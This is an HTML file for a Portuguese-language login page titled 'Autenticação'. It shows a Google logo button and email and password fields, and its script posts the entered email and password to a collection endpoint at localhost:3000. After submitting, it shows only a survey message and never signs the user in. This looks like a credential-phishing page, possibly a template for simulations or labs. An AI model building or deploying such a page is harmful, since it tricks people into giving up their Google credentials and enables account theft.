<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticação</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .auth-container {
            background-color: #ffffff;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .auth-container h2 {
            margin-top: 0;
            font-size: 24px;
            color: #333;
        }
        .auth-container p {
            margin: 10px 0;
            color: #666;
        }
        .auth-container .google-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 10px;
            margin: 10px 0;
            cursor: pointer;
            background-color: #fff;
        }
        .auth-container .google-btn img {
            width: 20px;
            margin-right: 10px;
        }
        .auth-container input[type="text"], .auth-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .auth-container a {
            color: #00a;
            text-decoration: none;
            display: block;
            margin: 10px 0;
        }
        .auth-container a:hover {
            text-decoration: underline;
        }
        .auth-container .submit-btn {
            background-color: #00a;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
        .auth-container .submit-btn:hover {
            background-color: #0077a3;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <h2>Autenticação</h2>
        <p>Use seu Email:</p>
        <div class="google-btn">
            <img src="https://www.google.com/favicon.ico" alt="Google logo">
            <span>Google</span>
        </div>
        <p>Preencha os dados de utilizador.</p>
        <input type="text" id="email" placeholder="Email">
        <input type="password" id="password" placeholder="Senha">
        <a href="#">Recuperar minha senha</a>
        <button class="submit-btn" onclick="submitData()">Entrar</button>
    </div>
    <script>
        function submitData() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            fetch('http://localhost:3000/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            })
            .then(response => response.json())
            .then(data => {
                alert('Você receberá um novo email para participar da pesquisa.');
            })
            .catch(error => {
                console.error('Erro:', error);
                alert('Ocorreu um erro ao enviar os dados. Por favor, tente novamente.');
            });
        }
    </script>
</body>
</html>
